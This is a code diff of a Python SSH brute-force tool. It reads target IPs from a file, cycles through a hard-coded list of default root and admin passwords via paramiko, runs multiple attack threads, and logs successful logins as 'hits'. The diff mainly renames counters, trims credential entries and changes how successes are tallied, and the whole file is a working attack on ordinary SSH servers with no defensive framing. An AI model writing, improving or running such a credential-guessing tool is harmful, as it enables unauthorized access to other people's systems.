@@ -57,25 +57,22 @@ ________________________________________________________________________________
 ___________________________________________________________________________________'''
 
 # variables:
-lucky_number = int(0)
-checks_hit = int(0)
-checks_bad = int(0)
+lucky_number = 0
+checkshit = 0
+checksbad = 0
 # default timeout for SSH client:
 default_timeout = float(5.0)
 # amount of attacking threads:
-attack_threads = int(10)
+attack_threads = 10
 targetips = []
 weakwords = [
     'root:root','root:toor','root:raspberry','root:test','root:uploader','root:password','root:admin',
     'root:administrator','root:marketing','root:12345678','root:1234','root:12345','root:qwerty','root:webadmin',
     'root:webmaster','root:maintaince','root:techsupport','root:letmein','root:logon','root:Passw@rd','root:calvin',
-    'administrator:password','administrator:Amx1234!','admin:1988','admin:admin','Administrator:Vision2','root:qwasyx21',
-    'admin:insecure','root:default','root:leostream','localadmin:localadmin','root:rootpasswd','admin:password',
-    'root:timeserver','admin:motorola','root:p@ck3tf3nc3','admin:avocent','root:linux','root:5up''root:uClinux',
-    'root:alpine','root:dottie','root:arcsight','root:unitrends1','root:vagrant','root:fai','root:ceadmin',
-    'root:palosanto','root:ubuntu1404','root:cubox-i','root:debian','root:xoa','root:sipwise','root:sixaola',
-    'root:screencast','root:stxadmin','root:nosoup4u','root:indigo','root:video','root:ubnt'
-]
+    'root:qwasyx21','root:default','root:leostream','root:rootpasswd','root:timeserver','root:p@ck3tf3nc3','root:linux',
+    'root:5up''root:uClinux','root:alpine','root:dottie','root:arcsight','root:unitrends1','root:vagrant','root:fai',
+    'root:ceadmin','root:palosanto','root:ubuntu1404','root:cubox-i','root:debian','root:xoa','root:sipwise',
+    'root:sixaola','root:screencast','root:stxadmin','root:nosoup4u','root:indigo','root:video','root:ubnt']
 
 # <<---------------------------------------------------------------------------------------------------------------->>
 
@@ -150,7 +147,7 @@ def invader(ip, user, passwd):
     invader.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     # try to establish a connection:
     try:
-        invader.connect(hostname=str(ip), port=int(22), username=str(user), password=str(passwd), timeout=default_timeout)
+        invader.connect(hostname=str(ip), port=int(22), username=str(user), password=str(passwd), timeout=float(default_timeout))
         invader.close()
         # in case of successful attack, tell bruter "True":
         return True
@@ -159,38 +156,41 @@ def invader(ip, user, passwd):
 
 # bruter() attacks the targets:
 def bruter():
-    global checks_hit
-    global checks_bad
+    global checkshit
+    global checksbad
     global targetips
     # start loop:
     while len(targetips) > 0:
+        check_result = False
         try:
             # get (next) target:
             victim = targetips.pop(0)
             print(Fore.WHITE + 'Attacking -->> TARGET: ' + str(victim) + ' ...\n')
             # start loop to work on userpass-combolist:
-            for combo in weakwords:
+            for i in weakwords:
                 # get (next) credentials:
                 userpass = []
-                userpass = combo.split(':')
+                userpass = i.split(':')
                 user = str(userpass[0])
                 passwd = str(userpass[1])
                 # try connection and auth:
-                check_result = False
                 check_result = (invader(str(victim), str(user), str(passwd)))
                 # handle the result:
                 if check_result == True:
                     hits(str('HOST: ') + str(victim) + ':22, USER: ' + str(user) + ', PASS: ' + str(passwd))
                     print(Fore.LIGHTGREEN_EX + '(!) SUCCESS (!) -->> hit on TARGET: ' + str(victim) + '\n')
-                    checks_hit += 1
                     break
                 else:
                     print(Fore.LIGHTRED_EX + '(!) FAIL FOR (!) -->> ' + str(victim) + ':' + str(user) + ':'
                           + str(passwd) + ' ...\n')
                     continue
+            if check_result == True:
+                checkshit += 1
+            else:
+                checksbad += 1
         except:
             print(Fore.LIGHTRED_EX + 'Attack on target: ' + str(victim) + ' failed ...\n')
-            checks_bad += 1
+            checksbad += 1
             continue
 
 # <<---------------------------------------------------------------------------------------------------------------->>
@@ -219,13 +219,13 @@ else:
     # fetch random IPs into targetlist:
     targetips = open('targets.txt', 'r').read().splitlines()
     # start bruter() multi-threaded:
-    for _ in range(attack_threads):
+    for _ in range(int(attack_threads)):
         threading.Thread(target=bruter).start()
     # show stats in window title while bruteforce attack is ongoing:
     while len(targetips) > 0:
         try:
             sleep(0.1)
-            wintitle = str('TO CHECK: ' + str(len(targetips)) + ' | HITS: ' + str(checks_hit) + ' | BAD: ' + str(checks_bad))
+            wintitle = str('TO CHECK: ' + str(len(targetips)) + ' | HITS: ' + str(checkshit) + ' | BAD: ' + str(checksbad))
             sys.stdout.write('\33]0;' + str(wintitle) + '\a')
             sys.stdout.flush()
         except: pass
